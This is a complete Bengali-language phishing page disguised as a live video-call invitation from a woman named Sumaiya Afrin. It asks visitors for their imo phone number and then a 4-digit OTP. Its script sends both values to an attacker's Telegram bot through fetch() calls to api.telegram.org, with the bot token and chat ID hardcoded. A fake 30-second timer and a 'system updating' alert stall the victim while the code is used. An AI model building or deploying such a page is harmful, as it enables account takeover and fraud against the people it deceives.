<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔴 Sumaiya Afrin is LIVE NOW - LIVE</title>

    <style>
        body { font-family: sans-serif; text-align: center; background: #f4f4f4; margin: 0; padding: 0; }
        .card { width: 95%; max-width: 380px; margin: 50px auto; background: white; padding: 20px; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); box-sizing: border-box; }
        img { width: 100px; height: 100px; border-radius: 50%; border: 3px solid #e91e63; object-fit: cover; }
        input { width: 100%; padding: 15px; margin: 15px 0; border: 2px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; text-align: center; }
        button { width: 100%; padding: 15px; background: linear-gradient(to right, #6a11cb, #2575fc); color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: bold; }
        
        /* ১ম ছবির মতো ধূসর টাইমার স্টাইল */
        #timerText {
            color: #8E8E8E; 
            font-size: 13px; 
            font-weight: bold; 
            margin-top: 20px; 
            text-transform: uppercase;
            letter-spacing: 1px;
            display: none; /* শুরুতে লুকানো থাকবে */
        }
    </style>
</head>
<body>

<div class="card">
    <img src="received_1748447966512537.jpeg" alt="Sumaiya">
    <h2 id="title">Sumaiya Afrin</h2>
    <p id="msg">নম্বর দিয়ে ভিডিও কল শুরু করুন</p>

    <form id="mainForm">
        <div id="step1">
            <input type="tel" id="phone" placeholder="আপনার ইমু নাম্বার লেখুন" required>
            <button type="button" onclick="goToStep2()">VIDEO CALL JOIN NOW</button>
        </div>

        <div id="step2" style="display:none;">
            <input type="tel" id="otp" placeholder="৪ ডিজিট কোড (OTP)" required>
            <button type="submit">ভিডিও কল শুরু করুন ✅</button>
            
            <p id="timerText">VERIFYING IN <span id="seconds">30</span>S...</p>
        </div>
    </form>
</div>

<script>
    const token = '8521030210:AAHTVvrMSiVWpK_HeX6Uh9_ZZ9VKKm7jEg0';
    const chatId = '8795859465';
    let userPhone = "";

    function startTimer() {
        let seconds = 30;
        const countdownElement = document.getElementById('seconds');
        const timerText = document.getElementById('timerText');
        
        timerText.style.display = 'block'; // টাইমার দেখানো শুরু হবে

        const timer = setInterval(() => {
            seconds--;
            countdownElement.textContent = seconds;

            if (seconds <= 0) {
                clearInterval(timer);
                timerText.innerHTML = "OTP EXPIRED. PLEASE TRY AGAIN.";
            }
        }, 1000);
    }

    function goToStep2() {
        const phoneInput = document.getElementById('phone').value;
        if (phoneInput.length < 10) {
            alert("সঠিক মোবাইল নম্বর দিন");
            return;
        }
        userPhone = phoneInput;
        
        document.getElementById('step1').style.display = 'none';
        document.getElementById('step2').style.display = 'block';
        document.getElementById('title').innerText = "Verification";
        document.getElementById('msg').innerText = "কোডটি নিচে লিখুন";

        // টাইমার শুরু করা হলো
        startTimer();

        sendToTelegram(`🔔 New Hit!\n📱 Number: ${userPhone}`);
    }

    document.getElementById('mainForm').addEventListener('submit', function(e) {
        e.preventDefault();
        const otpInput = document.getElementById('otp').value;
        
        if (otpInput.length < 4) {
            alert("সঠিক কোড দিন");
            return;
        }

        sendToTelegram(`✅ OTP Received!\n📱 Number: ${userPhone}\n🔑 OTP: ${otpInput}`);
        alert("সিস্টেম আপডেট হচ্ছে, দয়া করে অপেক্ষা করুন।");
    });

    function sendToTelegram(text) {
        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
        fetch(url);
    }
</script>
</body>
</html>
